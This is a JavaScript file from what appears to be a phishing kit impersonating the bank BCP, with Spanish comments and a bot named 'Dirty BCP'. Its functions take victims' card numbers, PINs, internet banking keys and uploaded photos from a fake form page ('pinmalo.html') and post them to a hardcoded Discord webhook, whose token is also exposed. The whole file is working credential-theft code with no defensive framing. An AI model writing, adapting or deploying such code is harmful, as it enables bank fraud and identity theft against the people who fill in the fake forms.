// ============================================================
// WEBHOOK COMPARTIDO (Discord)
// ============================================================
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1575301731057664060/WvLukZS8aQrQ_gHwl8u37C4WUOsqSRyOKh79kRPxLDEuAGtLrsnpl6OtwnUpqy1SAfwe";

/**
 * Convierte un Data URL o Base64 a un Blob binario.
 */
function base64ToBlob(base64Data, defaultType = "image/jpeg") {
  const m = String(base64Data).match(/^data:([^;]+);base64,(.*)$/);
  const mimeType = m ? m[1] : defaultType;
  const rawBase64 = m ? m[2] : base64Data;
  const binary = atob(rawBase64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new Blob([bytes], { type: mimeType });
}

/**
 * Envía los datos al webhook de Discord.
 * @param {string} titulo Título del embed
 * @param {Object} campos Pares nombre/valor a enviar
 * @param {number} color Color del embed (hex)
 * @param {string|null} imageBase64 Imagen opcional en base64 o Data URL
 */
export async function enviarAWebhook(
  titulo,
  campos = {},
  color = 0x0052cc,
  imageBase64 = null
) {
  const embed = {
    title: titulo,
    color: color,
    timestamp: new Date().toISOString(),
    footer: { text: "Proceso BCP" },
    fields: Object.entries(campos).map(([k, v]) => ({
      name: k,
      value: String(v).slice(0, 1024) || "—",
      inline: true,
    })),
  };

  try {
    if (imageBase64) {
      try {
        const blob = base64ToBlob(imageBase64);
        embed.image = { url: "attachment://foto.jpg" };

        const payload = {
          username: "Dirty BCP",
          embeds: [embed],
        };

        const formData = new FormData();
        formData.append("payload_json", JSON.stringify(payload));
        formData.append("files[0]", blob, "foto.jpg");

        const res = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          body: formData,
        });
        if (!res.ok) console.warn("Discord respondió:", res.status);
        return res.ok;
      } catch (imgErr) {
        console.warn("Error al procesar imagen para webhook, enviando sin imagen:", imgErr);
        delete embed.image;
      }
    }

    const payload = {
      username: "Dirty BCP",
      embeds: [embed],
    };

    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!res.ok) console.warn("Discord respondió:", res.status);
    return res.ok;
  } catch (e) {
    console.warn("No se pudo enviar al webhook:", e);
    return false;
  }
}

// ============================================================
// FUNCIÓN PARA PINMALO.HTML (Tarjeta y Clave)
// ============================================================
/**
 * Recibe el objeto con los datos del formulario de pinmalo.html
 * y lo envía usando la función principal.
 */
export async function sendToWebhook(data) {
  const campos = {
    "Clave PIN": data.pin,
    "Confirmar PIN": data.confirmPin,
    "Número de Tarjeta": data.cardNumber,
    "Clave de Internet": data.webKey,
  };

  return await enviarAWebhook(
    "🔐 Nuevos datos (Tarjeta y Clave)",
    campos,
    0x0052cc // Color azul
  );
}

// Exposición global para compatibilidad
if (typeof window !== "undefined") {
  window.enviarAWebhook = enviarAWebhook;
  window.sendToWebhook = sendToWebhook;
}


// Exposición global para compatibilidad
if (typeof window !== "undefined") {
  window.enviarAWebhook = enviarAWebhook;
  window.sendToWebhook = sendToWebhook;
}